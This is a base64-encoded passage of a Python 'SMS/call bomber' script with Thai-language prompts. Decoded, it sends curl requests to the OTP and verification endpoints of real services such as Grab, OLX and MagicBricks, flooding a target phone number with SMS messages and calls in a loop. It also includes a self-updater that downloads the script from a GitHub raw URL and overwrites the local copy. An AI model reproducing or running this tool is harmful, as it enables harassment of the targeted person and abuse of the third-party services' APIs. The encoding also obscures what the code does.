LUlOLGVuO3E9MC45LGVuLUdCO3E9MC44LGVuLVVTO3E9MC43LGhpO3E9MC42IiAtZCBcJycgKyBjb24gKyAnXCcgImh0dHBzOi8vYXBpLmNsb3VkLmFsdGJhbGFqaS5jb20vYWNjb3VudHMvbW9iaWxlL3ZlcmlmeT9kb21haW49SU4iIC1vIHRlbXAueHh4MicpCiAgICAgICAgd2hpbGUgbm90IG9zLnBhdGguZXhpc3RzKCd0ZW1wLnh4eDInKToKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjEpCiAgICAgICAgcmQgPSBoYXNobGliLm1kNShvcGVuKCd0ZW1wLnh4eDInLCAncmInKS5yZWFkKCkpLmhleGRpZ2VzdCgpCiAgICAgICAgcmV0dXJuIHJkID09ICcyNGY0NjdiMjQwODdmZjQ4Yzk2MzIxNzg2ZDg5YzY5ZicKICAgIGVsaWYgbGltID09IDE1OgogICAgICAgIHJkID0gb3MucG9wZW4oJ2N1cmwgLXMgLVggUE9TVCAtSCAiSG9zdDp3d3cuYWFsYS5jb20iIC1IICJDb25uZWN0aW9uOmtlZXAtYWxpdmUiIC1IICJBY2NlcHQ6YXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMSIgLUggIk9yaWdpbjpodHRwczovL3d3dy5hYWxhLmNvbSIgLUggIlgtUmVxdWVzdGVkLVdpdGg6WE1MSHR0cFJlcXVlc3QiIC1IICJTYXZlLURhdGE6b24iIC1IICJVc2VyLUFnZW50Ok1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgdml2byAxNzE4KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzUuMC4zNzcwLjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNiIgLUggIkNvbnRlbnQtVHlwZTphcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgiIC1IICJSZWZlcmVyOmh0dHBzOi8vd3d3LmFhbGEuY29tLyIgLUggIkFjY2VwdC1FbmNvZGluZzpnemlwLCBkZWZsYXRlLCBiciIgLUggIkFjY2VwdC1MYW5ndWFnZTplbi1JTixlbjtxPTAuOSxlbi1HQjtxPTAuOCxlbi1VUztxPTAuNyxoaTtxPTAuNixhcjtxPTAuNSIgLUggIkNvb2tpZTpmcm9udGVuZD1hMjdtbjNoM2lydDFybHQ2aTU1czkzcDlyNTsgZnJvbnRlbmRfY2lkPTh6cUJCendRVE1JdDlVS2c7IF9CRUFNRVJfVVNFUl9JRF9nQURyeWNCbjEyODcwPWM5ZmU0ZjdkLWI0MjEtNGJhZC05Y2YyLTBhNGRiNzE2ZGZmNDsgR19FTkFCTEVEX0lEUFM9Z29vZ2xlIiAtZCBcJ2VtYWlsPScgKyBjYyArIHBuICsgJyZmaXJzdG5hbWU9U3BlZWRYJmxhc3RuYW1lPVNwZWVkWFwnICJodHRwczovL3d3dy5hYWxhLmNvbS9hY2N1c3RvbWVyL2FqYXgvZ2V0T1RQIicpLnJlYWQoKS5zdHJpcCgpCiAgICAgICAgcmV0dXJuIHJkLmZpbmQoJ2NvZGU6JykgIT0gLTEKICAgIGVsaWYgbGltID09IDE2OgogICAgICAgIG9zLnBvcGVuKCdjdXJsIC1zIC1YIFBPU1QgLWQgXCdtZXRob2Q9U01TJmNvdW50cnlDb2RlPWlkJnBob25lTnVtYmVyPScgKyBjYyArIHBuICsKICAgICAgICAgICAgICAgICAnJnRlbXBsYXRlSUQ9cGF4X2FuZHJvaWRfcHJvZHVjdGlvblwnICJodHRwczovL2FwaS5ncmFiLmNvbS9ncmFiaWQvdjEvcGhvbmUvb3RwIicpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGVsaWYgbGltID09IDEwMDoKICAgICAgICByZCA9IG9zLnBvcGVuKCdjdXJsIC1zIC1YIEdFVCAiaHR0cHM6Ly93d3cubWFrYWFuLmNvbS9hcGlzL25jL3NlbmRPdHBPbkNhbGwvMTYyNTcwNjUvJyArCiAgICAgICAgICAgICAgICAgICAgICBwbiArICc/Y2FsbFR5cGU9b3RwT25DYWxsIicpLnJlYWQoKQogICAgICAgIHJldHVybiByZC5sb3dlcigpLmZpbmQoIm5ldyBvdHAgaGFzIGJlZW4iKSAhPSAtMQogICAgZWxpZiBsaW0gPT0gMTAxOgogICAgICAgIHJkID0gb3MucG9wZW4oJ2N1cmwgLXMgLVggUE9TVCAtZCBtb2JpbGU9JTJCJyArIGNjICsgJy0nICsgcG4gKwogICAgICAgICAgICAgICAgICAgICAgJyBodHRwczovL21hcmtldGluZy50bGxtcy5jb20vZWxlYXJuL2FwaS92NC9hdXRoZW50aWNhdGlvbnMvcGhvbmVfY2FsbCcpLnJlYWQoKQogICAgICAgIHJldHVybiByZC5sb3dlcigpLmZpbmQoIm90cCByZXF1ZXN0cyBleGNlZWRlZCIpID09IC0xCiAgICBlbGlmIGxpbSA9PSAxMDI6CiAgICAgICAgcmQgPSBvcy5wb3BlbignY3VybCAtcyAtWCBQT1NUIC1IICJIb3N0Ond3dy5yZWFsZXN0YXRlaW5kaWEuY29tIiAtSCAiY29udGVudC1sZW5ndGg6NTgiIC1IICJhY2NlcHQ6dGV4dC9odG1sLCAqLyo7IHE9MC4wMSIgLUggIm9yaWdpbjpodHRwczovL3d3dy5yZWFsZXN0YXRlaW5kaWEuY29tIiAtSCAieC1yZXF1ZXN0ZWQtd2l0aDpYTUxIdHRwUmVxdWVzdCIgLUggInNhdmUtZGF0YTpvbiIgLUggInVzZXItYWdlbnQ6TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyB2aXZvIDE3MTgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83NC4wLjM3MjkuMTU3IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiAtSCAiY29udGVudC10eXBlOmFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCIgLUggInJlZmVyZXI6aHR0cHM6Ly93d3cucmVhbGVzdGF0ZWluZGlhLmNvbS90aGFua3MucGhwP25ld3JlZyIgLUggImFjY2VwdC1lbmNvZGluZzpnemlwLCBkZWZsYXRlLCBiciIgLUggImFjY2VwdC1sYW5ndWFnZTplbi1JTixlbjtxPTAuOSxlbi1HQjtxPTAuOCxlbi1VUztxPTAuNyxoaTtxPTAuNiIgLUggImNvb2tpZTpfZ2F0PTEiIC1IICJjb29raWU6cmVpX21lbV9tb2JpbGVfdmVyaWZ5X3N0YXR1cz0wIiAtSCAiY29va2llOnJlaV9tZW1fZW1haWxfdmVyaWZ5X3N0YXR1cz1OIiAtSCAiY29va2llOnJlaV9tZW1fYmxvY2tfc3RhdHVzPTAiIC1IICJjb29raWU6cmVpX21lbWJlcl9jb3VudHJ5PUlOIiAtSCAiY29va2llOnJlaV9wYWlkX3N0YXR1cz0wIiAtSCAiY29va2llOnJlaV9tZW1iZXJfdHlwZT0xIiAtSCAiY29va2llOnJlaV9tZW1iZXJfZW1haWw9RmFrZW1hbSU0MHJpbC5jb20iIC1IICJjb29raWU6cmVpX21lbWJlcl9uYW1lPUZha2VtYW4iIC1IICJjb29raWU6cmVpX21lbWJlcl9pZD0xNTQ3MDQ1IiAtSCAiY29va2llOmNvb2tpX3Nlc3NfaWQ9OXE4YnN1Y2o2bWd2dTJkYzAzYmZzdmxmMDciIC1IICJjb29raWU6bmFtZT05cThic3VjajZtZ3Z1MmRjMDNiZnN2bGYwNyIgLUggImNvb2tpZTpfZ2lkPUdBMS4yLjYyNjUyNTkwOS4xNTYwODM2MzY5IiAtSCAiY29va2llOl9nYT1HQTEuMi4xMDMzMDc5MzMxLjE1NjA4MzYzNjkiIC1IICJjb29raWU6dmlzaXRlZFRva2VuPTE3Njk2MTU2MDgzNjM2NyIgLWQgXCdhY3Rpb25faWQ9Y2FsbF90b19vdHAmbW9iX251bT0nICsgcG4gKyAnJm1lbWJlcl9pZD0xNTQ3MDQ1XCcgImh0dHBzOi8vd3d3LnJlYWxlc3RhdGVpbmRpYS5jb20vbW9iaWxlLXNjcmlwdC9pbmRpYW5fbW9iaWxlX3ZlcmlmaWNhdGlvbl9mb3JtLnBocD9zaWQ9MC41OTgzMjIxMzk1ODA1MzU0IicpLnJlYWQoKQogICAgICAgIHJldHVybiByZC5sb3dlcigpLmZpbmQoInkiKSAhPSAtMQogICAgZWxpZiBsaW0gPT0gMTAzOgogICAgICAgIG9zLnN5c3RlbSgKICAgICAgICAgICAgJ2N1cmwgLXMgLVggUE9TVCAtSCAiSG9zdDp3d3cub2x4LmluIiAtSCAiY29udGVudC1sZW5ndGg6NDQiIC1IICJhY2NlcHQ6Ki8qIiAtSCAieC1uZXdyZWxpYy1pZDpWUU1HVTFaVkR4QUJVMWxiQmdNRFVsST0iIC1IICJvcmlnaW46aHR0cHM6Ly93d3cub2x4LmluIiAtSCAidXNlci1hZ2VudDpNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wLjI7IFNILTA0RykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc0LjAuMzcyOS4xNTcgTW9iaWxlIFNhZmFyaS81MzcuMzYiIC1IICJjb250ZW50LXR5cGU6YXBwbGljYXRpb24vanNvbiIgLUggInJlZmVyZXI6aHR0cHM6Ly93d3cub2x4LmluLyIgLUggImFjY2VwdC1lbmNvZGluZzpnemlwLCBkZWZsYXRlLCBiciIgLUggImFjY2VwdC1sYW5ndWFnZTplbi1VUyxlbjtxPTAuOSIgLUggImNvb2tpZTpvbmFwPTE2YjFiOGY0OGQ0eDc0NmQ0N2FiLTEtMTZiMWI4ZjQ4ZDR4NzQ2ZDQ3YWItMTktMTU1OTUzNzM0NSIgLUggImNvb2tpZTpibV9zdj1DREI5N0Y1MERBNjYxNUFDNDIwRjNFNkU3N0IwNEU0Mn5Pb1gyZkF1UDdnZ2NOYTBWanpFOTVGekpOS1JkSmxXMDlIamEwL2N5c0lHRjFzSm9CTzdpMG5kR1hxblRXTGF1bmx5eGt0SExiRThCU3N0UENSWW44VmRQMTVsdlV4SzNaWTlhaFhPU2d3QWlkeHdYZDFqQ2U1d2pJelliaVhwNWVLTldmRnBvd2hGYnB4bG9lK1NyYmlFMFlISlZQY0NWNWJtZHNIZ1BmUWM9IiAtSCAiY29va2llOkFNUF9UT0tFTj0lMjROT1RfRk9VTkQiIC1IICJjb29raWU6aGludD10cnVlIiAtSCAiY29va2llOl9naWQ9R0ExLjIuMzY5ODE5Mjc2LjE1NTk1MzU1MTciIC1IICJjb29raWU6X2dhPUdBMS4yLjY2NTY4ODc1My4xNTU5NTM1NTE3IiAtSCAiY29va2llOmxkVGQ9dHJ1ZSIgLUggImNvb2tpZTpHX0VOQUJMRURfSURQUz1nb29nbGUiIC1IICJjb29raWU6SElERV9PTkJPQVJESU5HX0xPQ0FUSU9OPXRydWUiIC1IICJjb29raWU6dGVzdENvb2tpZT10ZXN0Q29va2llIiAtSCAiY29va2llOmFrX2Jtc2M9MzA3QzUzMTFGQjAwQTNGNEU4NTZBRkZFMUE5RDAwMEIwMjE0QkVEOUUwMjEwMDAwOTA5RkY0NUMxRTgwMjA2N35wbEZaZmJNUUdnRURyN09XVmU5RnZxZlQyNFp0T1ZNYW10WWNhaXA3MUlZT3J2MitTUTZmb2tTdk1rMlVlc3o1djFzRmZhaWNoYnREZ2VWU2ozdGUzdlhKS2V6U1dndm9WV3JLN2dmekZyTHoxcnVCbTBNUWowMVY1Q21wYVRyNnRSZ0RSU042YmtzM25xdk9IelIwdEExSW9xZkRmcTJNS3RtRGpia25DSTVGbExZVVR3cWxud0hvd1lBcmZ5Ym4ybjN5aWxFNlZLSGpXK3RIOGtxakFmSDhCR3VpanBtTzlwTmtnbUl5T2VhWklWTTNrNkZHT0wzV2ozakxJOHVHYVUiIC1IICJjb29raWU6X2FiY2s9MTUzQkQzRDMzMzk0OEE1ODkzMjc0OENBQzNENEMzRjQwMjE0QkVEOUUwMjEwMDAwOTA5RkY0NUMxODgzOEUwNX4wfjhPK3VkeGRHMzhzQkZUUFpwYUJMNElHajdlVWNLSjFWd0F0SjUyR01PNUU9fi0xfi0xIiAtSCAiY29va2llOmJtX3N6PUJENjY1RDkxOUY3QzZGQTgzNzRGMTk2NDQ1NTk2NDM2fllBQVEyYjRVQXJwT0F3dHJBUUFBcTBxUEd3TmtzSEJncGhMd0R6d2ZCbHdJUlFKQUc3dHhtakJvL29mN05pQUo5M2d5Lzd2QmhROWw1c0lLZHd0bDJqK1U0YnlzMkhoaDV0WmxaTC9qcWRuVy9KcmdtZ2F3Y3hpdW5BSjMyQmJZOVV0bkZJck54YmJSdnpRQ1luU3dmL2N6OWE3alVSc3VpN2xldUxhVm03bVFFY0hQT3RDNmc1anJUb0FNVGJkQSIgLUggImNvb2tpZTo5N2MwOWUyYWFiZGZlZDg5Yjg3YTMwMTBkN2YxM2M2ND0zNTNiNGY5ZmQ4MmQyNjI2OGFkMTFiMmMxZTlhZTAxOSIgLUggImNvb2tpZTpscXN0YXR1cz0xNTU5NTM2NzA0IiAtSCAiY29va2llOmxhcXVlc2lzPXBhbi0yNjM4MUBhI3Bhbi0yNzc1MkBiI3Bhbi0zMDA0M0BiI3BhbmEtMjYzODFAYiIgLWQgXCd7InR5cGUiOiJjYWxsIiwiZGVzY3JpcHRvciI6Iis5MScgKyBwbiArICcifVwnICJodHRwczovL3d3dy5vbHguaW4vYXBpL2NoYWxsZW5nZXMiID4vZGV2L251bGwgMj4mMScpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGVsaWYgbGltID09IDEwNDoKICAgICAgICByZCA9IG9zLnBvcGVuKCdjdXJsIC1zIC1YIEdFVCAtSCAiSG9zdDphcGkubWFnaWNicmlja3MuY29tIiAtSCAiQ29ubmVjdGlvbjprZWVwLWFsaXZlIiAtSCAiVXNlci1BZ2VudDpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83NS4wLjM3NzAuODkgU2FmYXJpLzUzNy4zNiIgLUggIlNhdmUtRGF0YTpvbiIgLUggIkFjY2VwdDppbWFnZS93ZWJwLGltYWdlL2FwbmcsaW1hZ2UvKiwqLyo7cT0wLjgiIC1IICJBY2NlcHQtRW5jb2Rpbmc6Z3ppcCwgZGVmbGF0ZSwgYnIiIC1IICJBY2NlcHQtTGFuZ3VhZ2U6ZW4tSU4sZW47cT0wLjksZW4tR0I7cT0wLjgsZW4tVVM7cT0wLjcsaGk7cT0wLjYiICJodHRwczovL2FwaS5tYWdpY2JyaWNrcy5jb20vYnJpY2tzL3ZlcmlmeU9uQ2FsbC5odG1sP21vYmlsZT0nICsgcG4gKyAnIicpLnJlYWQoKS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICByZXR1cm4gcmQubG93ZXIoKS5zdHJpcCgpLmZpbmQoJ2NhbGxtYWRlJykgIT0gLTEKICAgIGVsaWYgbGltID09IDEwNjoKICAgICAgICByZCA9IG9zLnBvcGVuKAogICAgICAgICAgICAnY3VybCAtcyAiaHR0cHM6Ly93d3cubXl1cGNoYXIuY29tL3VzZXJfcHJvZmlsZS9yZXNlbmRfb3RwX3ZpYV92b2ljZT9pZD0nICsgcG4gKyAnIicpLnJlYWQoKQogICAgICAgIHJldHVybiByZC5maW5kKCIxIikgIT0gLTEKICAgIHJldHVybiBGYWxzZQoKCmRlZiByZW1zcChudW0pOgogICAgbnVtID0gbnVtLnJlcGxhY2UoJyAnLCAnJykKICAgIG51bSA9IG51bS5yZXBsYWNlKCctJywgJycpCiAgICByZXR1cm4gbnVtCgoKZGVmIHN0YXJ0KHRhcmdldCwgY291bnRlciwgZGVsYXksIGNoLCBjYyk6CiAgICBjbHIoKQogICAgYmFubmVyKCkKICAgIGZhaWxlZCA9IDAKICAgIHJlcXVlc3RlZCA9IDAKICAgIHN1Y2Nlc3MgPSBpbnQocmVxdWVzdGVkKSAtIGludChmYWlsZWQpCiAgICBib21icyA9IGludChjb3VudGVyKSArIDEKICAgIHdoaWxlIHN1Y2Nlc3MgPCAoaW50KGJvbWJzKSk6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgYmFubmVyKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGFwaSA9IHJhbmRvbS5jaG9pY2UoY2gpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgaWYgY2MgPT0gIjkxIjoKICAgICAgICAgICAgICAgIHByaW50KCfguILguK3guK3guKDguLHguKLguITguKPguLHguJpBUEnguYDguKrguLXguKInKQogICAgICAgICAgICAgICAgaW5wdXQoJ1ByZXNzIEVudGVyIFRvIEV4aXQuLi4nKQogICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiBzdWNjZXNzID4gMDoKICAgICAgICAgICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgICAgICAgICAgJ1xuXG5cdCBJbSBTb3JyeSBBcEkuLi4nKQogICAgICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgICAgICAnXG5XZSBBcmUgV29ya2luZyBUb28gSGFyZCBUbyBJbmNyZWFzZSBUaGUgSW50ZXJuYXRpb25hbCBMaW1pdC4uLicpCiAgICAgICAgICAgICAgICAgICAgaW5wdXQoCiAgICAgICAgICAgICAgICAgICAgICAgICdcbiDguKvguLLguIHguJXguYnguK3guIfguIHguLLguKPguJXguLTguJTguJXguYjguK3guYHguK3guJTguKHguLTguJkgRkI64Lii4Lil4Lii4Li44LiX4LiY4LmMIOC4p+C4seC4meC4iuC4suC4leC4tCAuLi5cblxuUHJlc3MgRW50ZXIgVG8gRXhpdC4uLicpCiAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdybSAqLnh4eCogPiAvZGV2L251bGwgMj4mMScpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xuXG4nKQogICAgICAgICAgICAgICAgICAgIGJhbm5lcigpCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KCdcblxuXHRTb3JyeSBZb3VyIENvdW50cnkgaXMgTm90IFN1cHBvcnRlZC4uLicpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICAgICAgICAgICdcdFx0UGxlYXNlIFNlbmQgQSBNYWlsIFRvIGJvc2dhcmVuYXRoYWlsbmFAZ21haWwuY29tIFRvIExldCBVcyBLbm93Li4uJykKICAgICAgICAgICAgICAgICAgICBpbnB1dCgnUHJlc3MgRW50ZXIgVG8gRXhpdC4uLicpCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgcHJpbnQocmFuZG9tLmNob2ljZShjb2xvcnMpKQogICAgICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKQogICAgICAgIHByaW50KCIgICAgICAgICAgICAgICAg4LiB4Liz4Lil4Lix4LiH4LiX4Liz4LiH4Liy4LiZICEhICAgICAgICAgICAgICAgIikKICAgICAgICBwcmludCgiICAgICDguIHguKPguLjguJPguLLguKPguK3guITguKfguLLguKHguYDguKPguYfguKfguIjguLDguYDguIHguLTguJTguIHguLHguJrguJTguLLguJXguYnguLLguKHguLfguK3guJbguLfguK3guILguK3guIfguITguLjguJMgISEgICAgIikKICAgICAgICBwcmludCgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgICAgICBwcmludCgiICAgICAgICAgICAgIOC5gOC4muC4reC4o+C5jCAgICAgICAgICAgOiArIiArIHN0cihjYykgKyAiICIsIHRhcmdldCkKICAgICAgICBwcmludCgiICAgICAgICAgICAgIOC4geC4s+C4peC4seC4h+C4quC5iOC4hyAgOiAiLCByZXF1ZXN0ZWQpCiAgICAgICAgcHJpbnQoIiAgICAgICAgICAgICDguKrguLPguYDguKPguYfguIjguIHguLLguKPguKrguYjguIcgICAgOiAiLCBzdWNjZXNzKQogICAgICAgIHByaW50KCIgICAgICAgICAgICAg4Liq4LmI4LiH4Lic4Li04LiU4Lie4Lil4Liy4LiUICAgICAgICAgOiAiLCBmYWlsZWQpCiAgICAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICAgICAgcHJpbnQoIiAgICAgICAgICAgICAg4Lit4Lii4LmI4Liy4Lib4Li04LiU4LmB4Lit4Lie4LiZ4Li14LmJ4LiI4LiZ4LiB4Lin4LmI4Liy4LiI4Liw4LiX4Liz4LiH4Liy4LiZ4LmA4Liq4Lij4LmH4LiIISEgICAgICAgICAgICAgICAgIikKICAgICAgICBwcmludCgiICAgICAgICAgICAgICBTY3JpcHRraW5nIFNDSyDguITguJnguJfguLPguKvguLPguYPguKvguI3guYggISEgICAgICAgICAgICAgICAgIikKICAgICAgICBwcmludCgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3VsdCA9IGdldGFwaSh0YXJnZXQsIGFwaSwgY2MpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcmVzdWx0ID0gRmFsc2UKICAgICAgICByZXF1ZXN0ZWQgPSByZXF1ZXN0ZWQgKyAxCiAgICAgICAgaWYgcmVzdWx0OgogICAgICAgICAgICBzdWNjZXNzID0gc3VjY2VzcyArIDEKICAgICAgICBlbHNlOgogICAgICAgICAgICBmYWlsZWQgPSBmYWlsZWQgKyAxCiAgICAgICAgICAgIHdoaWxlIGNoLmNvdW50KGFwaSkgPiAwOgogICAgICAgICAgICAgICAgY2gucmVtb3ZlKGFwaSkKICAgICAgICB0aW1lLnNsZWVwKGZsb2F0KGRlbGF5KSkKICAgICAgICBpZiByZXF1ZXN0ZWQgJSAzID09IDA6CiAgICAgICAgICAgIGNoZWNraW50ZXJuZXQoKQogICAgcHJpbnQoVykKICAgIHByaW50KCdcblxuQm9tYmluZyBDb21wbGV0ZWQuLicpCiAgICBvcy5zeXN0ZW0oJ3JtICoueHh4KiA+IC9kZXYvbnVsbCAyPiYxJykKICAgIGJhbm5lcigpCiAgICBleGl0KCkKCgpkZWYgdXBkYXRlKCk6CiAgICBzdHVmZl90b191cGRhdGUgPSBbJ2JvbWJlci5weScsICcudmVyc2lvbiddCiAgICBmb3IgZmwgaW4gc3R1ZmZfdG9fdXBkYXRlOgogICAgICAgIGRhdCA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oCiAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZy1hbm9ueW1vdXMvVGJvbWQyL21hc3Rlci8iICsgZmwpLnJlYWQoKQogICAgICAgIGZpbGUgPSBvcGVuKGZsLCAnd2InKQogICAgICAgIGZpbGUud3JpdGUoZGF0KQogICAgICAgIGZpbGUuY2xvc2UoKQogICAgcHJpbnQoJ1xuXHRcdCDguK3guLHguJ7guYDguJTguJfguKrguITguKPguLTguJvguYHguKXguYnguKcgISEhIScpCiAgICBwcmludCgnXHRQbGVhc2UgUnVuIFRoZSBTY3JpcHQgQWdhaW4uLi4nKQogICAgZXhpdCgpCgoKY2xyKCkKYmFubmVyKCkKdHJ5OgogICAgdXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbScpCmV4Y2VwdCBFeGNlcHRpb246CiAgICBwcmludCgi4LmD4LiK4LmJ4LmA4LiZ4LmH4LiV4LiZ4LmI4Liw4LiE4Lij4Lix4LiaISIpCiAgICBwcmludCgiXHRQbGVhc2UgQ29ubmVjdCBUbyBJbnRlcm5ldCBUbyBDb250aW51ZS4uLlxuIikKICAgIGlucHV0KCdFeGl0aW5nLi4uLlxuIFByZXNzIEVudGVyIFRvIENvbnRpbnVlLi4uLicpCiAgICBleGl0KCkKcHJpbnQoJ1x0Q2hlY2tpbmcgRm9yIFVwZGF0ZXMuLi4nKQp2ZXIgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKAogICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9nLWFub255bW91cy9UYm9tZDIvbWFzdGVyLy52ZXJzaW9uIikucmVhZCgpLmRlY29kZSgndXRmLTgnKQp2ZXJsID0gJycKdHJ5OgogICAgdmVybCA9IG9wZW4oIi52ZXJzaW9uIiwgJ3InKS5yZWFkKCkKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIHBhc3MKaWYgdmVyICE9IHZlcmw6CiAgICBwcmludCgnXG5cdFx0QW4gVXBkYXRlIGlzIEF2YWlsYWJsZS4uLi4nKQogICAgcHJpbnQoJ1x0U3RhcnRpbmcgVXBkYXRlLi4uJykKICAgIHVwZGF0ZSgpCnByaW50KCJZb3VyIFZlcnNpb24gaXMgVXAtVG8tRGF0ZSIpCnByaW50KCdcblxuXHRcdFx0U3RhcnRpbmcgVEJvbWIuLi5cblxuJykKdHJ5OgogICAgbm90aSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oCiAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9nLWFub255bW91cy9UYm9tZDIvbWFzdGVyLy5ub3RpZnkiKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCiAgICBub3RpID0gbm90aS51cHBlcigpLnN0cmlwKCkKICAgIGlmIGxlbihub3RpKSA+IDEwOgogICAgICAgIHByaW50KCdcblxuXHROT1RJRklDQVRJT046ICcgKyBub3RpICsgJ1xuXG4nKQpleGNlcHQgRXhjZXB0aW9uOgogICAgcGFzcwp3aGlsZSBUcnVlOgogICAgcG4gPSAiIgogICAgY2MgPSBpbnB1dCgiXHQg4LmD4Liq4LmI4Lij4Lir4Lix4Liq4Lib4Lij4Liw4LmA4LiX4LioICjguJXguLHguKfguK3guKLguYjguLLguIcgKzY2KSA6ICIpCiAgICBpZiAnKycgaW4gY2M6CiAgICAgICAgdGMgPSBsaXN0KGNjKQogICAgICAgIHRjLnJlbW92ZSgnKycpCiAgICAgICAgY2MgPSAnJy5qb2luKHRjKQogICAgICAgIGNjID0gY2Muc3RyaXAoKQogICAgcG4gPSBpbnB1dCgiXHQg4LmD4Liq4LmI4LmA4Lia4Lit4Lij4LmMICjguJXguLHguKfguK3guKLguYjguLLguIcgOTk3MDcyMDc1KTogKyIgKyBjYyArICIgIikKICAgIHBuID0gcmVtc3AocG4pCiAgICBpZiBsZW4oY2MpID49IDQgb3IgbGVuKGNjKSA8IDE6CiAgICAgICAgcHJpbnQoJ1xuXG5JbnZhbGlkIENvdW50cnkgQ29kZS4uXG5cdFx0Q291bnRyeSBDb2RlcyBBcmUgR2VuZXJhbGx5IDEtMyBkaWdpdHMuLi5cbicpCiAgICAgICAgY29udGludWUKICAgIGlmIGxlbihwbikgPD0gNjoKICAgICAgICBwcmludCgnXG5cbiDguYTguKHguYjguJ7guJrguYDguJrguK3guKPguYwuLlxuJykKICAgICAgICBjb250aW51ZQogICAgZm9yIGNjaCBpbiBzdHIoY2MgKyBwbik6CiAgICAgICAgaWYgbm90IGNjaC5pc2RpZ2l0KCk6CiAgICAgICAgICAgIHByaW50KCdcblxuUGhvbmUgTnVtYmVyIE11c3QgQ29uc2lzdCBPZiBOdW1iZXJzIE9ubHlcbicpCiAgICAgICAgICAgIGNvbnRpbnVlCiAgICBicmVhawp0eXBlID0gMAp0cnk6CiAgICBpZiBzeXMuYXJndlsxXSA9PSAiY2FsbCI6CiAgICAgICAgdHlwZSA9IDEKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIHR5cGUgPSAwCmlmIHR5cGUgPT0gMToKICAgIG5tID0gaW50KGlucHV0KCLguYPguKrguYjguITguYjguLLguJfguLXguYjguJXguYnguK3guIfguIHguLLguKMgKOC4quC4ueC4h+C4quC4uOC4lCAxNSk6ICIpKQogICAgaWYgbm0gPiAxNToKICAgICAgICBwcmludCgiXHRcdCDguITguLjguJPguYDguKXguLfguK3guIHguYHguKXguYnguKciICsgc3RyKG5tKSArCiAgICAgICAgICAgICAgIi5cblx0Tm9ybWFsaXppbmcgVmFsdWUgVG8gMTUiKQogICAgICAgIG5tID0gMTUKICAgIGRsID0gZmxvYXQoaW5wdXQoIuC5gOC4p+C4peC4suC4geC4suC4o+C4quC5iOC4hyAo4LmB4LiZ4Liw4LiZ4LizIDEw4Lin4Li0ICkgW1JlY29tbWVuZGVkIDEwIHNlYyBdIDogIikpCmVsaWYgdHlwZSA9PSAwOgogICAgaWYgY2MgPT0gIjkxIjoKICAgICAgICBubSA9IGludChpbnB1dCgi4LiB4Liz4Lir4LiZ4LiU4LiC4LmJ4Lit4LiE4Lin4Liy4Lih4LiB4Liy4Lij4Liq4LmI4LiHICgwIEZvciBVbmxpbWl0ZWQpOiAiKSkKICAgICAgICBkbCA9IGZsb2F0KAogICAgICAgICAgICBpbnB1dCgiRW50ZXIgRGVsYXkgdGltZSAoaW4gc2Vjb25kcykgW1JlY29tbWVuZGVkIDIgc2VjIF0gOiAiKSkKICAgIGVsc2U6CiAg